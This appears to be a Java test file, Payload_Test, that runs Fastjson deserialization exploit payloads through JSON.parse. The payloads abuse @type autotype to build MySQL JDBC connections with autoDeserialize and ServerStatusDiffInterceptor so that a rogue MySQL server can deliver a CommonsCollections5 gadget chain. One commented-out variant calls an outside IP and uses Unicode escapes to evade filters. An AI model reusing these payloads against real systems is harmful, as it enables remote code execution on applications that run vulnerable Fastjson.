package com.example.demo;

import com.alibaba.fastjson.JSON;

public class Payload_Test {
    public static void main(String[] args){

//        //搭配使用 https://github.com/fnmsd/MySQL_Fake_Server
//        String payload_mysqljdbc = "{\"aaa\":{\"@type\":\"\\u006a\\u0061\\u0076\\u0061.lang.AutoCloseable\", \"@type\":\"\\u0063\\u006f\\u006d.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"121.5.40.91\",\"portToConnectTo\":3306,\"url\":\"jdbc:mysql://121.5.40.91:3306/test?detectCustomCollations=true&autoDeserialize=true&user=\",\"databaseToConnectTo\":\"test\",\"info\":{\"@type\":\"\\u006a\\u0061\\u0076\\u0061.util.Properties\",\"PORT\":\"3306\",\"statementInterceptors\":\"\\u0063\\u006f\\u006d.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"user\":\"cb\",\"PORT.1\":\"3306\",\"HOST.1\":\"172.20.64.40\",\"NUM_HOSTS\":\"1\",\"HOST\":\"172.20.64.40\",\"DBNAME\":\"test\"}}\n" + "}";
//
//        JSON.parse(payload_mysqljdbc);
//
//        JSON.parseObject(payload_mysqljdbc);

        String json2="{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\":3306, \"info\": { \"user\": \"CommonsCollections5\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } }";
//        String json2="{ \"name\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\":{ \"url\":\"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false\" } } }}";
//        String json2="{ \"name\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\":{ \"url\":\"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false\" } } }}";

        Object obj1 = JSON.parse(json2);
        System.out.println(obj1);


    }
}